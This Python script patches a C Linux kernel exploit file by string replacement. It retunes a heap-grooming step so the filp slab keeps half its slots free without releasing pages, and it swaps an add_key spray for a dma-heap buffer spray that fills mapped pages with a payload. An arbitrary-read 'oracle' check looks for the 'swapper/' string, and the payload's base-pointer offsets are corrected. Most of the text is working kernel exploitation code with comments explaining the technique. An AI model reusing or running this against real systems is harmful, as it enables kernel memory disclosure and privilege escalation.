import re

with open("tier2/scripts/test_m7_spray.c", "r") as f:
    text = f.read()

# Replace the bg_fds close logic
old_bg_close = """    for (int i = 0; i < BG_PRESSURE; i++) {
        if (bg_fds[i] >= 0) close(bg_fds[i]);
    }"""

# We only close ODD index files, leaving EVEN index files open!
# This creates 2000 empty slots, but NO empty pages!
new_bg_close = """    // PRE-FILL FILP CACHE: close only half of the bg_fds!
    // This creates 2000 empty slots in the filp cache, but leaves 1 object on every page.
    // So NO bg_fds pages are returned to buddy!
    // When dma-buf spray runs, alloc_file will use these 2000 slots and NEVER ask buddy!
    for (int i = 0; i < BG_PRESSURE; i++) {
        if (i % 2 != 0) {
            if (bg_fds[i] >= 0) close(bg_fds[i]);
        }
    }"""

text = text.replace(old_bg_close, new_bg_close)

# Replace add_key spray with dma-buf spray
old_spray = """    char desc[32];
    for (int r = 0; r < P_ROUNDS; r++) {
        for (int i = 0; i < PAGES_PER; i++) {
            snprintf(desc, sizeof(desc), "key_%d_%d", r, i);
            long ret = syscall(__NR_add_key, "user", desc, payload, sizeof(payload), KEY_SPEC_PROCESS_KEYRING);
            if (ret < 0) {
                printf("[-] add_key failed round %d iter %d\\n", r, i);
                break;
            }
        }
        
        lseek(fdinfo_fd, 0, SEEK_SET);
        uint64_t f_ino = aar_read(fdinfo_fd);
        if (f_ino == 0x2f72657070617773) {
            printf("[+] Oracle Hit! 'swapper/' found in round %d (slabs=%d)\\n", r, read_slabs());
            hit = 1;
            break;
        }
    }"""

new_spray = """    int dma_fds[P_ROUNDS * PAGES_PER];
    for (int r = 0; r < P_ROUNDS; r++) {
        for (int i = 0; i < PAGES_PER; i++) {
            struct dma_heap_allocation_data alloc = { .len = 4096, .fd_flags = O_RDWR | O_CLOEXEC, .heap_flags = 0 };
            int ret = ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &alloc);
            if (ret < 0) {
                printf("[-] alloc failed\\n");
                break;
            }
            dma_fds[r * PAGES_PER + i] = alloc.fd;
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, alloc.fd, 0);
            if (p == MAP_FAILED) break;
            
            memcpy(p, payload, 4096);
        }
        
        lseek(fdinfo_fd, 0, SEEK_SET);
        uint64_t f_ino = aar_read(fdinfo_fd);
        if (f_ino == 0x2f72657070617773) {
            printf("[+] Oracle Hit! 'swapper/' found in round %d (slabs=%d)\\n", r, read_slabs());
            hit = 1;
            break;
        }
    }"""

text = text.replace(old_spray, new_spray)

# Remove the 'if (file_off < 24) continue;' skip!
text = text.replace("if (file_off < 24) continue; // Skip offset 0", "")
# Fix the base pointer calculation!
text = text.replace("uint64_t base = (uint64_t)(payload + file_off - 24);", "uint64_t base = (uint64_t)(payload + file_off);")

with open("tier2/scripts/test_m7_spray.c", "w") as f:
    f.write(text)
